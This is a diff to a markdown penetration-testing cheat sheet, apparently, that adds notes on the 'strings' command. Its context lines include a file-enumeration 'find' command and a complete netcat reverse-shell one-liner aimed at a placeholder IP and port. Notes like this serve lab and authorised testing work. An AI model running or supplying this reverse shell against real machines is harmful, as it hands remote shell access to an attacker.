@@ -18,3 +18,7 @@ find / -group groupName -type f 2>/dev/null
 
 ## Linux Netcat:
 * rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f
+
+## Strings/Information
+* strings fname > fileName
+* strings fname |more
